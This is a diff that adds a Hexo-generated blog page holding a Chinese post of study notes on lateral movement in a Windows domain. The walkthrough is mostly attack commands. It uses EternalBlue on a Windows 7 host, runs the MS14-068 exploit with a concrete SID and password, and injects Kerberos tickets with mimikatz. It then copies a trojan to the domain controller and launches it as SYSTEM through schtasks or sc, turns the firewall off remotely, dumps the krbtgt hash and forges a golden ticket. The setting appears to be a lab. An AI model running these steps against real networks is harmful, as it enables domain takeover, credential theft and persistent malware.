@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>横向移动 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="横向移动的概念红队和蓝队:  ​    红队(APT) &#x3D;&#x3D;&gt; 攻击方  ​    蓝队 &#x3D;&#x3D;&gt; 守方 横向移动(内网漫游): 在内网网段中, 拿下了一台主机, 以这台主机为跳板, 向旁边的主机取做渗透. 直到拿下整个环境(拿下域控) net view &#x3D;&#x3D;&gt; 看当前域内在线成员 net view &#x2F;domain &#x3D;&#x3D;&gt; 看当前有几个域环境 横向移动以win 7 为跳板,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="横向移动">
+<meta property="og:url" content="http://yoursite.com/2021/09/04/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="横向移动的概念红队和蓝队:  ​    红队(APT) &#x3D;&#x3D;&gt; 攻击方  ​    蓝队 &#x3D;&#x3D;&gt; 守方 横向移动(内网漫游): 在内网网段中, 拿下了一台主机, 以这台主机为跳板, 向旁边的主机取做渗透. 直到拿下整个环境(拿下域控) net view &#x3D;&#x3D;&gt; 看当前域内在线成员 net view &#x2F;domain &#x3D;&#x3D;&gt; 看当前有几个域环境 横向移动以win 7 为跳板,">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-09-04T14:18:26.000Z">
+<meta property="article:modified_time" content="2021-09-04T14:18:41.782Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.0.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-横向移动" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/09/04/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="article-date">
+  <time datetime="2021-09-04T14:18:26.000Z" itemprop="datePublished">2021-09-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      横向移动
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="横向移动的概念"><a href="#横向移动的概念" class="headerlink" title="横向移动的概念"></a>横向移动的概念</h2><p>红队和蓝队: </p>
+<p>​    红队(APT) ==&gt; 攻击方 </p>
+<p>​    蓝队 ==&gt; 守方</p>
+<p>横向移动(内网漫游): 在内网网段中, 拿下了一台主机, 以这台主机为跳板, 向旁边的主机取做渗透. 直到拿下整个环境(拿下域控)</p>
+<p>net view ==&gt; 看当前域内在线成员</p>
+<p>net view /domain ==&gt; 看当前有几个域环境</p>
+<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>以win 7 为跳板, 向域控进行渗透</p>
+<ol>
+<li><p>用永恒之蓝攻击win7</p>
+</li>
+<li><p>做信息搜集</p>
+</li>
+<li><p>用ms14-068向域控提权</p>
+<p>ms14068 -u <a href="mailto:&#105;&#x6c;&#x75;&#64;&#105;&#108;&#117;&#x2e;&#99;&#x6f;&#x6d;">&#105;&#x6c;&#x75;&#64;&#105;&#108;&#117;&#x2e;&#99;&#x6f;&#x6d;</a> -d 192.168.1.141 -s S-1-5-21-542716808-1865610110-2530282010-1105 -p 123123q.</p>
+<p>注入之前: 需要清除票据</p>
+<p>​    CMD: klist purge 清除票据 | klist 查看票据</p>
+<p>​    mimikatz: kerberos::purge 清除票据 | kerberos::list 查看票据</p>
+<p>清除票据后注入票据:</p>
+<p>mimikatz “privilege::debug” “kerberos::ptc xxxx.ccache” exit</p>
+<p>dir \\域控主机名\C$  ==&gt; <code>访问成功即漏洞利用成功, 拿到域控权限</code></p>
+</li>
+<li><p>上传木马到域控并启动木马, 获取shell</p>
+<p>copy 木马 \\域控主机名\C$</p>
+<p>有两种方式运行木马:</p>
+<ol>
+<li><p>以计划任务的方式运行 ==&gt; 推荐用(可以以system运行)</p>
+<p>schtasks</p>
+<p>创建计划任务</p>
+<p>schtasks /create /s WIN-AFETP0IBEKR /tn w /ru system /tr “c:\shell.exe” /sc onstart </p>
+<p>运行</p>
+<p>schtasks /run /s WIN-AFETP0IBEKR /tn w</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">参数列表:</span><br><span class="line">    &#x2F;Create         创建新计划任务。</span><br><span class="line"></span><br><span class="line">    &#x2F;Delete         删除计划任务。</span><br><span class="line"></span><br><span class="line">    &#x2F;Query          显示所有计划任务。</span><br><span class="line"></span><br><span class="line">    &#x2F;Change         更改计划任务属性。</span><br><span class="line"></span><br><span class="line">    &#x2F;Run            按需运行计划任务。</span><br><span class="line"></span><br><span class="line">    &#x2F;End            中止当前正在运行的计划任务。</span><br><span class="line"></span><br><span class="line">    &#x2F;ShowSid        显示与计划的任务名称相应的安全标识符。</span><br><span class="line"></span><br><span class="line">    &#x2F;?              显示此帮助消息。</span><br><span class="line">    </span><br><span class="line">&#x2F;create:</span><br><span class="line"> &#x2F;S   system 连接远程主机</span><br><span class="line"> &#x2F;RU  username &#x3D;&#x3D;&gt; &lt;system&gt; 指定运行文件的用户</span><br><span class="line"> &#x2F;SC   schedule 计划任务运行的频率</span><br><span class="line"> &#x2F;TR   taskrun &#x3D;&#x3D;&gt; 设置要运行的程序</span><br><span class="line"> &#x2F;TN   taskname &#x3D;&#x3D;&gt; 给计划任务取名字</span><br><span class="line"> &#x2F;F    &#x3D;&#x3D;&gt; 强制创建</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+</li>
+</ol>
+<pre><code>2. 以服务的方式运行木马
+
+   sc &lt;server&gt; create [service name] [binPath= ] options...
+
+   1. 关闭防火墙
+
+      sc \\WIN-AFETP0IBEKR  create e binpath= &quot;netsh advfirewall set allprofiles state off&quot;
+
+      sc \\WIN-AFETP0IBEKR start e
+
+   2. 运行木马
+
+      sc \\WIN-AFETP0IBEKR create mua binpath= &quot;c:\\service.exe&quot;
+
+      sc \\WIN-AFETP0IBEKR start mua</code></pre>
+<ol start="5">
+<li><p>拿下域控, 提权, 拿到krbtgt票据</p>
+<p>​    hashdump 拿 krbtgt hash</p>
+</li>
+<li><p>制作金票</p>
+<p>golden_ticket_create :</p>
+<p>-d : 域名</p>
+<p>-k : krbtgt NTLM</p>
+<p>-s : 域sid</p>
+<p>-t : 指定生成的文件(tck)</p>
+<p>-u : 要伪造的用户</p>
+<p>清除票据</p>
+<p>kerberos_ticket_purge</p>
+<p>创建票据</p>
+<p>golden_ticket_create -d ilu.com -u adminsitrator -k 9d093f0496bcbbf9999845340c57cd6b -s S-1-5-21-542716808-1865610110-2530282010 -t gold.tck</p>
+<p>注入票据</p>
+<p>kerberos_ticket_use gold.tck</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">load kiwi &#x3D;&#x3D;&gt; msf加载mimikatz</span><br><span class="line"></span><br><span class="line">creds_all 列出所有的凭据信息</span><br><span class="line">golden_ticket_create 制作金票</span><br><span class="line">kerberos_ticket_list 列出当前的票据信息</span><br><span class="line">kerberos_ticket_purge 清除票据</span><br><span class="line">kerberos_ticket_use 使用票据</span><br></pre></td></tr></table></figure>
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/09/04/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" data-id="ckt5vgrst000ncgvj1ixj20g5" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/09/02/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">黄金票据</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/09/04/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">横向移动</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/02/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/">黄金票据</a>
+          </li>
+        
+          <li>
+            <a href="/2021/08/31/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/">域渗透基础</a>
+          </li>
+        
+          <li>
+            <a href="/2021/08/26/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/">端口转发和代理</a>
+          </li>
+        
+          <li>
+            <a href="/2021/08/24/empire%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92%E5%92%8C%E4%BB%A3%E7%90%86/">empire会话传递和代理</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
